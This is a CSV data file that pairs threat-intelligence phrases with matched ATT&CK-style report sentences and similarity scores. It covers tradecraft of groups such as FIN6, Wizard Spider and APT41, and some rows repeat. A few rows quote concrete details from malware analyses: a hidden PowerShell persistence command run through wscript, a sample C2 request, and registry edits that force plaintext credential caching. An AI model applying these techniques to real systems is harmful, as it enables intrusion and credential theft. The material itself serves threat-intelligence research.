phrase,before,matching_sentence,after,report_id,rank,cosine_score
ta505 has used fast flux to mask botnets by distributing payloads across multiple ips.,"[1]enterpriset1486data encrypted for impactta505has used a wide variety of ransomware, such asclop, locky, jaff, bart, philadelphia, and globeimposter, to encrypt victim files and demand a ransom payment. [1]enterpriset1140deobfuscate/decode files or informationta505has decrypted packed dlls with an xor key.",[4]enterpriset1568.001dynamic resolution:fast flux dnsta505has used fast flux to mask botnets by distributing payloads across multiple ips.,[8]enterpriset1562.001impair defenses:disable or modify toolsta505has used malware to disable windows defender. [5]enterpriset1105ingress tool transferta505has downloaded additional malware to execute on victim systems.,66f579983063d29485700a7e,4101,0.758558040492302
ta505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.,"[1]enterpriset1204.001user execution:malicious linkta505has used lures to get users to click links in emails and attachments. for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files.",[1][2][3][10][9][12][8][13].002user execution:malicious fileta505has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.,"for example,ta505makes their malware look like legitimate microsoft word documents, .pdf and/or .lnk files. [1][2][3][10][9][12][8][13][6]enterpriset1078.002valid accounts:domain accountsta505has used stolen domain admin accounts to compromise additional hosts.",66f579983063d29485700a7e,4125,0.7116499991656768
it has also used common document file names for other malware binaries.,"[7]enterpriset1570lateral tool transferwizard spiderhas used stolen credentials to copy tools into the%temp%directory of domain controllers. [6]enterpriset1036.004masquerading:masquerade task or servicewizard spiderhas used scheduled tasks to installtrickbot, using task names to appear legitimate such as windotnet, googletask, or sysnetsf.",[6]it has also used common document file names for other malware binaries.,"[4]enterpriset1112modify registrywizard spiderhas modified the registry keyhklm\\\\system\\\\currentcontrolset\\\\control\\\\securityproviders\\\\wdigestby setting theuselogoncredentialregistry value to1in order to force credentials to be stored in clear text in memory.wizard spiderhas also modified the wdigest registry key to allow plaintext credentials to be cached in memory. [6][7]enterpriset1135network share discoverywizard spiderhas used the ""net view"" command to locate mapped network shares.",66f579d13063d29485700aa5,148,1.0000000000000002
it has also used powershell to execute commands and move laterally through a victim network.,[2][4].004boot or logon autostart execution:winlogon helper dllwizard spiderhas established persistence using userinit by adding the registry key hklm\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon. [4]enterpriset1059.001command and scripting interpreter:powershellwizard spiderhas used macros to execute powershell scripts to download malware on victim's machines.,[6]it has also used powershell to execute commands and move laterally through a victim network.,[2][4][12][7].003command and scripting interpreter:windows command shellwizard spiderhas usedcmd.exeto execute commands on a victim's machine. [11][7]enterpriset1136.001create account:local accountwizard spiderhas created local administrator accounts to maintain persistence in compromised networks.,66f579d13063d29485700aa5,126,1.0000000000000002
"wizard spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.","[2]enterpriset1018remote system discoverywizard spiderhas used networkdll for network discovery and psfin specifically for financial and point of sale indicators.wizard spiderhas also usedadfind,nltest/dclist, and powershell script get-datainfo.ps1 to enumerate domain computers, including the domain controller. [5][6][4][12][11][7]enterpriset1053.005scheduled task/job:scheduled taskwizard spiderhas used scheduled tasks to establish persistence fortrickbotand other malware.","[6][2][4][13][7]enterpriset1489service stopwizard spiderhas used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.",[11]enterpriset1518software discoverywizard spiderhas utilized the powershell scriptget-datainfo.ps1to collect installed backup software information from a compromised machine. [7].001security software discoverywizard spiderhas used wmi to identify anti-virus products installed on a victim's machine.,66f579d13063d29485700aa5,167,0.7407318101024934
wizard spider has sent phishing emails containing a link to an actor-controlled google drive document or other free online file hosting services.,"[4].003os credential dumping:ntdswizard spiderhas gained access to credentials via exported copies of the ntds.dit active directory database.wizard spiderhas also created a volume shadow copy and used a batch script file to collect ntds.dit with the use of the windows utility, ntdsutil. [4][7]enterpriset1566.001phishing:spearphishing attachmentwizard spiderhas used spearphishing attachments to deliver microsoft documents containing macros or pdfs containing malicious links to download eitheremotet, bokbot,trickbot, orbazar.",[6][12][7].002phishing:spearphishing linkwizard spiderhas sent phishing emails containing a link to an actor-controlled google drive document or other free online file hosting services.,"[2][13]enterpriset1055process injectionwizard spiderhas used process injection to execute payloads to escalate privileges. [7].001dynamic-link library injectionwizard spiderhas injected malicious dlls into memory with read, write, and execute permissions.",66f579d13063d29485700aa5,158,0.7416434383476351
it has also used common document file names for other malware binaries.,"[7]enterpriset1570lateral tool transferwizard spiderhas used stolen credentials to copy tools into the%temp%directory of domain controllers. [6]enterpriset1036.004masquerading:masquerade task or servicewizard spiderhas used scheduled tasks to installtrickbot, using task names to appear legitimate such as windotnet, googletask, or sysnetsf.",[6]it has also used common document file names for other malware binaries.,"[4]enterpriset1112modify registrywizard spiderhas modified the registry keyhklm\\\\system\\\\currentcontrolset\\\\control\\\\securityproviders\\\\wdigestby setting theuselogoncredentialregistry value to1in order to force credentials to be stored in clear text in memory.wizard spiderhas also modified the wdigest registry key to allow plaintext credentials to be cached in memory. [6][7]enterpriset1135network share discoverywizard spiderhas used the ""net view"" command to locate mapped network shares.",66f579d13063d29485700aa5,148,1.0000000000000002
it has also used powershell to execute commands and move laterally through a victim network.,[2][4].004boot or logon autostart execution:winlogon helper dllwizard spiderhas established persistence using userinit by adding the registry key hklm\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon. [4]enterpriset1059.001command and scripting interpreter:powershellwizard spiderhas used macros to execute powershell scripts to download malware on victim's machines.,[6]it has also used powershell to execute commands and move laterally through a victim network.,[2][4][12][7].003command and scripting interpreter:windows command shellwizard spiderhas usedcmd.exeto execute commands on a victim's machine. [11][7]enterpriset1136.001create account:local accountwizard spiderhas created local administrator accounts to maintain persistence in compromised networks.,66f579d13063d29485700aa5,126,1.0000000000000002
registry entries in hklm\\software\\\\wow6432node\\\\\\microsoft\\windows nt\\currentversion\\winlogon\\ and hkcu\\software\\microsoft\\windows nt\\currentversion\\winlogon\\ are used to manage additional helper programs and functionalities that support winlogon.,"it also removed the functionality of double-clicking to auto-mount isos.disable browser password saving via group policy (gpo), set the following policies below then close the group policy management editor:- disable saving browser history: enabled- enable autofill: disabled- enable saving password to the password manager: disabled- default cookies setting: enabled: keep cookies for the duration of the session- enable saving password to the password manager: disabledalways deploy the highest level of protection on your firewall and endpoints. in particular:- ensure the firewall has tls 1.3 inspection, next-gen ips, and streaming dpi with machine learning and sandboxing for protection from the latest threats.- ensure endpoints have modern next-gen protection capabilities to guard against downloading malicious files from untrusted sources.detectionswhen some of the above-mentioned protections and mitigations cannot be implemented, the detection ideas below could help to identify potential threats early on.monitor new file creations with double extension ending with executable file extensions (.exe, .vbs, .bat and etc.",).monitor modification and creation of windows registry keys and sub-keys under winlogon registry locations (hklm\\\\software[\\\\wow6432node\\\\]\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon\\\\ and hkcu\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon\\\\).,"establishing a baseline for the values of often abused registry key locations could also improve detection accuracy.establish command line baselines for command line commands of common executables, such as powershell, cmd, and other lolbins (including msbuild), to identify potential malicious usage of the built-in tools.mitre att&cktactic: techniqueatt&ck codeexecution: user execution malicious filet1204execution: powershellt1059.001defenseevasion:deobfuscate/decode files or informationt1140defenseevasion: masquerading double file extensiont1036.007defenseevasion: trusted developer utilities proxy executionmsbuildt1127.001defenseevasion: html smugglingt1027.006defenseevasion: dll side-loadingt1574.002command and control:  bidirectional communicationt1102.002initial access:spearphishingattachmentt1566.001persistence:winlogonhelper dllt1547.004credential access: credentials from web browserst1555.003hunting resources:yara rulesabout eclecticiq intelligence & research teameclecticiq is a global provider of threat intelligence, hunting, and response technology and services. headquartered in amsterdam, theeclecticiq intelligence & research teamis made up of experts from europe and the u.s. with decades of experience in cyber security and intelligence in industry and government.we would love to hear from you.",66f57a8e3063d29485700b0b,2021,0.7651828279197798
quadagent modifies an hkcu registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting c2 communications.,"to create the scheduled task, the powershell payload starts by writing the following to a vbscript file with the same name as the task name  (ex.office365dcomcheck.vbsorsystemdiskclean.vbs) within the%temp%folder:createobject(""wscript.shell"").run""""&wscript.arguments(0)&"""",0,falsethe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. the task itself is fairly simple, calling the vbscript file which contains a powershell one-liner as an argument to run the quadagent payload (ex.office365dcomcheck.ps1andsystemdiskclean.ps1):wscript.exe""office365dcomcheck.vbs""\\\\""powershell.exe-executionpolicybypass-windowstylehidden-noprofile'<current powershell script>'\\\\""after setting up persistent access, the payload checks to see if a value exists within a registry key in thehkcuhive whose name is the same as the scheduled task (ex.","office365dcomcheck or systemdiskclean), such as the following:hkcu\\\\office365dcomcheckthe payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre-shared key used for encrypting and decrypting communications between the system and the c2 server.","this registry key is empty upon the first execution of the payload. the payload will communicate with its c2 server to obtain the session id and pre-shared key and write it to this registry key in the following format:<session id>_<pre-shared key>to obtain the session id and pre-shared key, the payload will first try to contact the c2 via an https get request to the following url:hxxps://www.rdppath[.",66f57b5f3063d29485700b82,1931,0.7281746036473512
fin6 has used has used metasploit’s named-pipe impersonation technique to escalate privileges.,"today this malware shows unwanted ads, tomorrow it could steal sensitive information; from private messages to banking credentials and much more.the “agent smith” campaign serves as a sharp reminder that effort from system developers alone is not enough to build a secure android eco-system. it requires attention and action from system developers, device manufacturers, app developers, and users, so that vulnerability fixes are patched, distributed, adopted and installed in time.it is also another example for why organizations and consumers alike should have an advanced mobile threat prevention solution installed on the device to protect themselves against the possibility of unknowingly installing malicious apps, even from trusted app stores.for more information about how to keep your device protected, check outsand blast mobile.",enterpriset1134access token manipulationfin6has used has used metasploit’s named-pipe impersonation technique to escalate privileges.,"[2]enterpriset1087.002account discovery:domain accountfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1]enterpriset1560archive collected datafollowing data collection,fin6has compressed log files into a zip archive prior to staging and exfiltration.",66f57cd43063d29485700c42,4307,0.7243974002950362
"fin6 has encoded data gathered from the victim with a simple substitution cipher and single-byte xor using the 0xaa key, and base64 with character permutation.","[2]enterpriset1087.002account discovery:domain accountfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1]enterpriset1560archive collected datafollowing data collection,fin6has compressed log files into a zip archive prior to staging and exfiltration.","[1].003archive via custom methodfin6has encoded data gathered from the victim with a simple substitution cipher and single-byte xor using the 0xaa key, and base64 with character permutation.","[1][7]enterpriset1119automated collectionfin6has used a script to iterate through a list of compromised pos systems, copy and remove data to a log file, and to bind to events from the submit payment button. [1][7]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderfin6has used registry run keys to establish persistence for its downloader tools known as hardtack and shipbread.",66f57cd43063d29485700c42,4310,0.8369794753599546
fin6 used the plink command-line utility to create ssh tunnels to c2 servers.,[1][2]enterpriset1566.001phishing:spearphishing attachmentfin6has targeted victims with e-mails containing malicious attachments. [8].003phishing:spearphishing via servicefin6has used fake job advertisements sent via linkedin to spearphish targets.,[4]enterpriset1572protocol tunnelingfin6used the plink command-line utility to create ssh tunnels to c2 servers.,"[1]enterpriset1021.001remote services:remote desktop protocolfin6used rdp to move laterally in victim networks. [1][2]enterpriset1018remote system discoveryfin6used publicly available tools (including microsoft's built-in sql querying tool, osql.exe) to map the internal network and conduct reconnaissance against active directory, structured query language (sql) servers, and netbios.",66f57cd43063d29485700c42,4338,0.7335333274261124
"fin6 has used a script to iterate through a list of compromised pos systems, copy and remove data to a log file, and to bind to events from the submit payment button.","[1]enterpriset1560archive collected datafollowing data collection,fin6has compressed log files into a zip archive prior to staging and exfiltration. [1].003archive via custom methodfin6has encoded data gathered from the victim with a simple substitution cipher and single-byte xor using the 0xaa key, and base64 with character permutation.","[1][7]enterpriset1119automated collectionfin6has used a script to iterate through a list of compromised pos systems, copy and remove data to a log file, and to bind to events from the submit payment button.",[1][7]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderfin6has used registry run keys to establish persistence for its downloader tools known as hardtack and shipbread. [1]enterpriset1110.002brute force:password crackingfin6has extracted password hashes from ntds.dit to crack offline.,66f57cd43063d29485700c42,4311,0.8651913467438096
"fin6 has used scripting to iterate through a list of compromised pos systems, copy data to a log file, and remove the original data files.",[1][7]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderfin6has used registry run keys to establish persistence for its downloader tools known as hardtack and shipbread. [1]enterpriset1110.002brute force:password crackingfin6has extracted password hashes from ntds.dit to crack offline.,"[1]enterpriset1059command and scripting interpreterfin6has used scripting to iterate through a list of compromised pos systems, copy data to a log file, and remove the original data files.","[1][2].001powershellfin6has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener. [1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools.",66f57cd43063d29485700c42,4314,0.8085753682083398
fin6 has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp.,[1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools. [2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites.,[7]enterpriset1555credentials from password storesfin6has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp.,[8].003credentials from web browsersfin6has used the stealer one credential stealer to target web browsers. [8]enterpriset1213data from information repositoriesfin6has collected schemas and user accounts from systems running sql server.,66f57cd43063d29485700c42,4318,0.7839295928340632
fin6 has used the stealer one credential stealer to target web browsers.,[2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites. [7]enterpriset1555credentials from password storesfin6has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp.,[8].003credentials from web browsersfin6has used the stealer one credential stealer to target web browsers.,[8]enterpriset1213data from information repositoriesfin6has collected schemas and user accounts from systems running sql server. [8]enterpriset1005data from local systemfin6has collected and exfiltrated payment card data from compromised systems.,66f57cd43063d29485700c42,4319,0.745828233250655
"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1048.003exfiltration over alternative protocol:exfiltration over unencrypted non-c2 protocolfin6has sent stolen payment card data to remote servers via http posts. [7]enterpriset1068exploitation for privilege escalationfin6has used tools to exploit windows vulnerabilities in order to escalate privileges.,"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,66f57cd43063d29485700c42,4326,1.0000000000000002
fin6 has used malicious javascript to steal payment card data from e-commerce sites.,"[1][2].001powershellfin6has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener. [1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools.",[2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites.,[7]enterpriset1555credentials from password storesfin6has used the stealer one credential stealer to target e-mail and file transfer utilities including ftp. [8].003credentials from web browsersfin6has used the stealer one credential stealer to target web browsers.,66f57cd43063d29485700c42,4317,0.8105204050231672
"fin6 has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,"[1]enterpriset1036.004masquerading:masquerade task or servicefin6has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.","[2]enterpriset1046network service discoveryfin6used publicly available tools (including microsoft's built-in sql querying tool, osql.exe) to map the internal network and conduct reconnaissance against active directory, structured query language (sql) servers, and netbios. [1]enterpriset1095non-application layer protocolfin6has used metasploit bind and reverse tcp stagers.",66f57cd43063d29485700c42,4329,0.7129614313743845
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57cac3063d29485700c2b,2677,0.7074855274059076
machete employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57cac3063d29485700c2b,2677,0.7857802503334574
"fin6 has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener.","[1]enterpriset1110.002brute force:password crackingfin6has extracted password hashes from ntds.dit to crack offline. [1]enterpriset1059command and scripting interpreterfin6has used scripting to iterate through a list of compromised pos systems, copy data to a log file, and remove the original data files.","[1][2].001powershellfin6has used powershell to gain access to merchant's networks, and a metasploit powershell module to download and execute shellcode and to set up a local listener.",[1][2][8].003windows command shellfin6has usedkill.batscript to disable security tools. [2].007javascriptfin6has used malicious javascript to steal payment card data from e-commerce sites.,66f57cd43063d29485700c42,4315,0.8963183400216717
fin6 has used fake job advertisements sent via linkedin to spearphish targets.,[1][2].003os credential dumping:ntdsfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1][2]enterpriset1566.001phishing:spearphishing attachmentfin6has targeted victims with e-mails containing malicious attachments.,[8].003phishing:spearphishing via servicefin6has used fake job advertisements sent via linkedin to spearphish targets.,[4]enterpriset1572protocol tunnelingfin6used the plink command-line utility to create ssh tunnels to c2 servers. [1]enterpriset1021.001remote services:remote desktop protocolfin6used rdp to move laterally in victim networks.,66f57cd43063d29485700c42,4337,0.7490993886764684
"to move laterally on a victim network, fin6 has used credentials stolen from various systems on which it gathered usernames and password hashes.",[4]enterpriset1569.002system services:service executionfin6has created windows services to execute encoded powershell commands. [2]enterpriset1204.002user execution:malicious filefin6has used malicious documents to lure victims into allowing execution of powershell scripts.,"[8]enterpriset1078valid accountsto move laterally on a victim network,fin6has used credentials stolen from various systems on which it gathered usernames and password hashes.",[1][2][8]enterpriset1102web servicefin6has used pastebin and google storage to host content for their operations. [2]enterpriset1047windows management instrumentationfin6has used wmi to automate the remote execution of powershell scripts.,66f57cd43063d29485700c42,4345,0.7366954099667927
"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1048.003exfiltration over alternative protocol:exfiltration over unencrypted non-c2 protocolfin6has sent stolen payment card data to remote servers via http posts. [7]enterpriset1068exploitation for privilege escalationfin6has used tools to exploit windows vulnerabilities in order to escalate privileges.,"the tools targeted cve-2013-3660, cve-2011-2005, and cve-2010-4398, all of which could allow local users to access kernel-level privileges.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,66f57cd43063d29485700c42,4326,1.0000000000000002
"fin6 has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.",[1]enterpriset1562.001impair defenses:disable or modify toolsfin6has deployed a utility script namedkill.batto disable anti-virus. [2]enterpriset1070.004indicator removal:file deletionfin6has removed files from victim machines.,"[1]enterpriset1036.004masquerading:masquerade task or servicefin6has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate windows service.","[2]enterpriset1046network service discoveryfin6used publicly available tools (including microsoft's built-in sql querying tool, osql.exe) to map the internal network and conduct reconnaissance against active directory, structured query language (sql) servers, and netbios. [1]enterpriset1095non-application layer protocolfin6has used metasploit bind and reverse tcp stagers.",66f57cd43063d29485700c42,4329,0.7129614313743845
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f57cac3063d29485700c2b,2677,0.7074855274059076
fin6 has used fake job advertisements sent via linkedin to spearphish targets.,[1][2].003os credential dumping:ntdsfin6has used metasploit’spsexecntdsgrab module to obtain a copy of the victim's active directory database. [1][2]enterpriset1566.001phishing:spearphishing attachmentfin6has targeted victims with e-mails containing malicious attachments.,[8].003phishing:spearphishing via servicefin6has used fake job advertisements sent via linkedin to spearphish targets.,[4]enterpriset1572protocol tunnelingfin6used the plink command-line utility to create ssh tunnels to c2 servers. [1]enterpriset1021.001remote services:remote desktop protocolfin6used rdp to move laterally in victim networks.,66f57cd43063d29485700c42,4337,0.7490993886764684
apt41 deployed master boot record bootkits on windows systems to hide their malware and maintain persistence on victim systems.,[6]enterpriset1069permission groups discoveryapt41usednet groupcommands to enumerate various windows user groups and permissions. [6]enterpriset1566.001phishing:spearphishing attachmentapt41sent spearphishing emails with attachments such as compiled html (.chm) files to initially compromise their victims.,[1]enterpriset1542.003pre-os boot:bootkitapt41deployed master boot record bootkits on windows systems to hide their malware and maintain persistence on victim systems.,[1]enterpriset1055process injectionapt41malware tidyelf loaded the main winterlove component by injecting it into the iexplore.exe process. [1]enterpriset1090proxyapt41used a tool called classfon to covertly proxy network communications.,66f57dc63063d29485700ce4,4886,0.7197727465637611
apt41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.,"[5]enterpriset1596.005search open technical databases:scan databasesapt41uses the chinese website fofa.su, similar to the shodan scanning service, for passive scanning of victims. [6]enterpriset1505.003server software component:web shellduringc0017,apt41deployed jscript web shells through the creation of malicious viewstate objects.",[5]enterpriset1553.002subvert trust controls:code signingapt41leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.,"[1][2]enterpriset1195.002supply chain compromise:compromise software supply chainapt41gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users. [1]enterpriset1218.001system binary proxy execution:compiled html fileapt41used compiled html (.chm) files for targeting.",66f57dc63063d29485700ce4,4899,0.7371762679561298
apt41 used a ransomware called encryptor raas to encrypt files on the targeted systems and provide a ransom note to the user.,"[1][2]apt41created the storsyncsvc service to provide persistence for cobalt strike. [7]enterpriset1555.003credentials from password stores:credentials from web browsersapt41used browserghost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.",[6]enterpriset1486data encrypted for impactapt41used a ransomware called encryptor raas to encrypt files on the targeted systems and provide a ransom note to the user.,[1]enterpriset1213.003data from information repositories:code repositoriesapt41cloned victim user git repositories during intrusions. [6]enterpriset1005data from local systemapt41has uploaded files and data from a compromised host.,66f57dc63063d29485700ce4,4830,0.7789226130838616
"apt41 used legitimate websites for c2 through dead drop resolvers , including github, pastebin, and microsoft technet.",[7][2]enterpriset1550.002use alternate authentication material:pass the hashapt41uses tools such asmimikatzto enable lateral movement via captured password hashes. [6]enterpriset1078valid accountsapt41used compromised credentials to log on to other systems.,"[1][3]enterpriset1102.001web service:dead drop resolverapt41used legitimate websites for c2 through dead drop resolvers (ddr), including github, pastebin, and microsoft technet.","[1]duringc0017,apt41used dead drop resolvers on two separate tech community forums for theirkeyplugwindows-version backdoor; notablyapt41updated the community forum posts frequently with new dead drop resolvers during the campaign. [5]enterpriset1047windows management instrumentationapt41used wmi in several ways, including for execution of commands via wmiexec as well as for persistence viapowersploit.",66f57dc63063d29485700ce4,4914,0.7382099643594191
"apt41 exploited cve-2020-10189 against zoho manageengine desktop central, and cve-2019-19781 to compromise citrix application delivery controllers  and gateway devices.","[5]enterpriset1041exfiltration over c2 channelduringc0017,apt41used its cloudflare services c2 channels for data exfiltration. [5]enterpriset1567exfiltration over web serviceduringc0017,apt41used cloudflare services for data exfiltration.","[5]enterpriset1190exploit public-facing applicationapt41exploited cve-2020-10189 against zoho manageengine desktop central through unsafe deserialization, and cve-2019-19781 to compromise citrix application delivery controllers (adc) and gateway devices.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.",66f57dc63063d29485700ce4,4844,0.7628845879730504
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.","[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation. [5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.",66f57dc63063d29485700ce4,4847,0.7568610646741867
"apt41 leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.","[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation. [5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.",66f57dc63063d29485700ce4,4847,0.913225640163206
apt41 compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.,"[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396. [1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation.",[5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.,"[1]enterpriset1008fallback channelsapt41used the steam community page as a fallback mechanism for c2. [1]enterpriset1083file and directory discoveryapt41has executedfile /bin/pwdon exploited victims, perhaps to return architecture related information.",66f57dc63063d29485700ce4,4849,0.8511069340458088
